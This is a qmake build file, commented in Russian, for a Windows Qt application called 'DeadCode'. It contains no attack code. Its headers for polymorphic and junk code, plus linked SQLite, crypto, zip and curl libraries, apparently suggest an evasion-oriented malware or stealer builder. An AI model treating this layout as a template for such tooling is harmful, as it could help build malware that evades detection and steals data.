# Основные модули Qt, которые используются в проекте
QT += core gui network widgets

# Имя целевого исполняемого файла
TARGET = DeadCode
# Тип проекта — приложение
TEMPLATE = app

# Исходные файлы (.cpp)
SOURCES += \
    src/main.cpp \
    ui/mainwindow.cpp

# Заголовочные файлы (.h)
HEADERS += \
    ui/mainwindow.h \
    src/build_key.h \
    src/polymorphic_code.h \
    src/junk_code.h

# Файлы интерфейса (.ui)
FORMS += \
    ui/mainwindow.ui

# Ресурсы (иконка)
RC_ICONS = icon.ico

# Пути для поиска заголовочных файлов
INCLUDEPATH += \
    src \
    ui \
    C:/vcpkg/installed/x64-windows-static/include \
    ../release

# Библиотеки (vcpkg и системные Windows-библиотеки)
LIBS += -LC:/vcpkg/installed/x64-windows-static/lib \
        -lsqlite3 \
        -lzip \
        -lz \
        -lbz2 \
        -lcurl \
        -lbcrypt \
        -lws2_32 \
        -lgdiplus \
        -liphlpapi \
        -lpsapi \
        -lshlwapi \
        -lcrypt32 \
        -lgdi32

# Флаги компиляции
QMAKE_CXXFLAGS += -O2 \
                  -std=c++17 \
                  -Wall \
                  -Wextra \
                  -Werror=return-type \
                  -fexceptions \
                  -DUNICODE \
                  -D_UNICODE \
                  -DWIN32 \
                  -DQT_NO_DEBUG \
                  -D_CRT_SECURE_NO_WARNINGS

# Флаги линковки
QMAKE_LFLAGS += -DYNAMICBASE \
                -NXCOMPAT \
                -SUBSYSTEM:WINDOWS

# Определения для сборки (добавляем дату сборки и версию из git)
BUILD_DATE = $$system(powershell -Command "Get-Date -Format 'yyyyMMdd'")
BUILD_VERSION = $$system(git rev-parse --short HEAD 2> nul || echo unknown)
DEFINES += BUILD_DATE=\\\"$${BUILD_DATE}\\\" \
           BUILD_VERSION=\\\"$${BUILD_VERSION}\\\"

# Директории для выходных файлов
DESTDIR = ../build
OBJECTS_DIR = ../release
MOC_DIR = ../release
UI_DIR = ../release

# Очистка (удаляем исполняемый файл и промежуточные файлы)
QMAKE_CLEAN += \
    $$DESTDIR/DeadCode.exe \
    $$OBJECTS_DIR/*.o \
    $$MOC_DIR/*.cpp \
    $$UI_DIR/*.h

# Дополнительные проверки и зависимости для Windows
win32 {
    CONFIG(debug, debug|release) {
        # Для отладочной сборки
        QMAKE_CXXFLAGS += -g
    } else {
        # Для релизной сборки
        QMAKE_CXXFLAGS += -O2
        QMAKE_LFLAGS += -O2
    }
}

# Пользовательские шаги сборки для генерации заголовков
PRE_TARGETDEPS += \
    src/build_key.h \
    src/polymorphic_code.h \
    src/junk_code.h

# Создание пустых файлов, если они отсутствуют (кроссплатформенный способ)
!exists(src/build_key.h) {
    system(powershell -Command "New-Item -Path src/build_key.h -ItemType File -Force")
}
!exists(src/polymorphic_code.h) {
    system(powershell -Command "New-Item -Path src/polymorphic_code.h -ItemType File -Force")
}
!exists(src/junk_code.h) {
    system(powershell -Command "New-Item -Path src/junk_code.h -ItemType File -Force")
}